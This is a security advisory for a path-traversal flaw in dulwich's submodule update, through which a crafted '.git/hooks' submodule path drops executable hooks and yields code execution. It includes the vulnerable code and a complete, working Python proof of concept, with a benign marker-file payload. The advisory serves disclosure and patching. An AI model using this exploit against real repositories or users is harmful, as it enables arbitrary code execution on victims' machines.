# [H] Dulwich's submodule path traversal in porcelain.submodule_update / porcelain.clone(recurse_submodules=True) yields RCE via attacker-dropped .git/hooks payload

## Summary
Severity: High
Advisory: GHSA-gfhv-vqv2-4544
CVE: CVE-2026-52726
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-02
Source: https://github.com/advisories/GHSA-gfhv-vqv2-4544
Type: github-advisory

## Affected
- PyPI: `dulwich` — affected >=0.23.2 <1.2.5

## Details
### Summary

`dulwich.porcelain.submodule_update`, and by extension `porcelain.clone(..., recurse_submodules=True)`, materializes attacker-controlled submodule paths from a crafted upstream repository without path validation. A malicious `.gitmodules` plus a matching tree gitlink whose `path` is `.git/hooks` (or any other directory inside the parent repository's `.git` directory) causes the attacker's submodule tree contents to be written directly into the victim's `.git/hooks/` directory, preserving executable mode bits. The dropped executables are then run by any subsequent `git` or `dulwich` command that invokes the matching hook, resulting in arbitrary code execution.

This is the dulwich equivalent of the upstream Git fixes for CVE-2024-32002 / CVE-2024-32004, which were never propagated into dulwich's separately implemented submodule porcelain.

### Affected

- **Package:** `dulwich` (PyPI)
- **Affected versions:** `>=0.23.2, <1.2.5`
- **Affected platforms:** all (Linux, macOS, Windows). Exploitation does not require a case-insensitive or NTFS filesystem, because the path written is a literal `.git/hooks` rather than a case- or short-name-aliased form.

Affected entry points:
- `dulwich.porcelain.submodule_update(repo, init=True, recursive=True)`
- `dulwich.porcelain.clone(source, target, recurse_submodules=True)`
- `dulwich submodule update` CLI / `dulwich clone --recurse-submodules` CLI

### Vulnerable code

The submodule path from the tree's gitlink entry (and matching `.gitmodules`) is consumed without validation in [`dulwich/porcelain/submodule.py`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L154-L234).

The attacker-controlled `path` enters the loop from `iter_cached_submodules` ([`submodule.py#L154-L168`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L154-L168)):

```python
for path, target_sha in submodules_to_update:
    path_str = (
        path.decode(DEFAULT_ENCODING) if isinstance(path, bytes) else path
    )

    submodule_name: bytes | None = None
    for sm_path, sm_url, sm_name in read_submodules(gitmodules_path):
        if sm_path == path:
            submodule_name = sm_name
            break

    if not submodule_name:
        continue
```

It flows unchecked into `os.path.join` and the filesystem ([`submodule.py#L187-L188`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L187-L188)):

```python
            submodule_path = os.path.join(r.path, path_str)
            submodule_git_dir = os.path.join(r.controldir(), "modules", path_str)
```

Finally, the attacker tree's contents are materialized into that directory via `build_index_from_tree` with no `validate_path_element` argument, defaulting to the lax validator ([`submodule.py#L229-L234`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L229-L234)):

```python
                    build_index_from_tree(
                        submodule_path,
                        sub_repo.index_path(),
                        sub_repo.object_store,
                        tree_id,
                    )
```

Three issues compound:

1. `path_str` originates from the parent repository's tree gitlink entry (attacker-controlled) and is never validated against `.git`, `..`, or other path-traversal patterns. The same value is read from the attacker-supplied `.gitmodules` blob via [`read_submodules`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/config.py#L1637-L1665), which also performs no validation.
2. `submodule_path = os.path.join(r.path, path_str)` therefore resolves to an attacker-chosen directory anywhere on disk (e.g. `<worktree>/.git/hooks`).
3. [`build_index_from_tree`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/index.py#L2034-L2044) is called without `validate_path_element`, so it defaults to `validate_path_element_default`, which only rejects literal `.git`, `.`, and `..`. It does not refuse a `root_path` that is itself inside the parent's `.git` directory, and it honors the attacker tree's file modes including executable bits (`0o100755`).

### Reachability

A direct production call path from a user invocation: `porcelain.clone(source, target, recurse_submodules=True)` at [`dulwich/porcelain/__init__.py:1548-1551`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/__init__.py#L1548-L1551) calls `submodule_update(repo, init=True, recursive=True)` once the parent clone completes, reaching the unsanitized loop at [`submodule.py#L154-L234`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L154-L234).

The CLI command `dulwich clone --recurse-submodules <url>` reaches the same sink via [`dulwich/cli.py:2131`](https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/cli.py#L2131).

Any service that exposes `porcelain.clone(..., recurse_submodules=True)` on attacker-supplied URLs is exposed: CI runners, repository import tools, package resolvers that use dulwich as a pure-Python git, and language-server "fetch dependency from git" features.

### Proof of concept

End-to-end against pip-installed `dulwich==1.2.4`, demonstrating both the path-traversal primitive and the resulting code execution when the victim subsequently runs `git`. The payload writes a marker file rather than performing any destructive action.

```python
import os, tempfile, subprocess
import dulwich.repo as r
import dulwich.porcelain as p
from dulwich.objects import Blob, Commit, Tree

WORKDIR = tempfile.mkdtemp(prefix="dulwich-poc-")
ATTACKER = os.path.join(WORKDIR, "att.git")
VICTIM_PARENT = os.path.join(WORKDIR, "vic_parent.git")
VICTIM_WT = os.path.join(WORKDIR, "vic_wt")
MARKER = os.path.join(WORKDIR, "marker")

# Attacker submodule contains a single file named "post-checkout"
# with mode 0755 and a benign shell payload that writes a marker file.
attacker = r.Repo.init_bare(ATTACKER, mkdir=True)
payload = b"#!/bin/sh\necho executed > " + MARKER.encode() + b"\n"
pb = Blob.from_string(payload)
attacker.object_store.add_object(pb)
at = Tree()
at.add(b"post-checkout", 0o100755, pb.id)
attacker.object_store.add_object(at)
ac = Commit()
ac.tree = at.id
ac.author = ac.committer = b"a <a@a>"
ac.author_time = ac.commit_time = 0
ac.author_timezone = ac.commit_timezone = 0
ac.message = b"x"
attacker.object_store.add_object(ac)
attacker.refs[b"refs/heads/master"] = ac.id
attacker.refs.set_symbolic_ref(b"HEAD", b"refs/heads/master")

# Victim parent has a .gitmodules and a tree gitlink, both pointing at
# path ".git/hooks". The gitlink targets the attacker submodule commit.
victim = r.Repo.init_bare(VICTIM_PARENT, mkdir=True)
gitmod = (
    b'[submodule "evil"]\n'
    b'\tpath = .git/hooks\n'
    b'\turl = ' + ATTACKER.encode() + b'\n'
)
gmb = Blob.from_string(gitmod)
victim.object_store.add_object(gmb)
vt = Tree()
vt.add(b".gitmodules", 0o100644, gmb.id)
vt.add(b".git/hooks", 0o160000, ac.id)
victim.object_store.add_object(vt)
vc = Commit()
vc.tree = vt.id
vc.author = vc.committer = b"a <a@a>"
vc.author_time = vc.commit_time = 0
vc.author_timezone = vc.commit_timezone = 0
vc.message = b"v"
victim.object_store.add_object(vc)
victim.refs[b"refs/heads/master"] = vc.id
victim.refs.set_symbolic_ref(b"HEAD", b"refs/heads/master")

# Single victim call: clone with recurse_submodules=True
p.clone(VICTIM_PARENT, VICTIM_WT, recurse_submodules=True)

hook = os.path.join(VICTIM_WT, ".git", "hooks", "post-checkout")
assert os.path.exists(hook), "hook was not written"
assert os.stat(hook).st_mode & 0o111, "hook is not executable"

# git running in the victim worktree then executes the dropped hook
subprocess.run(["git", "-C", VICTIM_WT, "checkout", "master"], check=True,
               capture_output=True)
assert os.path.exists(MARKER), "hook did not fire"
print("Code execution confirmed:", open(MARKER).read().strip())
```

The trigger surface is broader than this proof of concept: the dropped file fires for any matching hook name (`post-checkout`, `pre-commit`, `post-merge`, `post-rewrite`, `post-applypatch`, and others). dulwich itself executes several hooks (`pre-commit`, `commit-msg`, `post-commit`, `pre-receive`, `update`, `post-receive`; see `dulwich/hooks.py` and `dulwich/repo.py`), so a victim using only dulwich is also reachable without upstream Git.

### Credit

tonghuaroot

## References
- https://github.com/jelmer/dulwich/security/advisories/GHSA-gfhv-vqv2-4544
- https://nvd.nist.gov/vuln/detail/CVE-2026-52726
- https://github.com/jelmer/dulwich
- https://github.com/jelmer/dulwich/releases/tag/dulwich-1.2.5
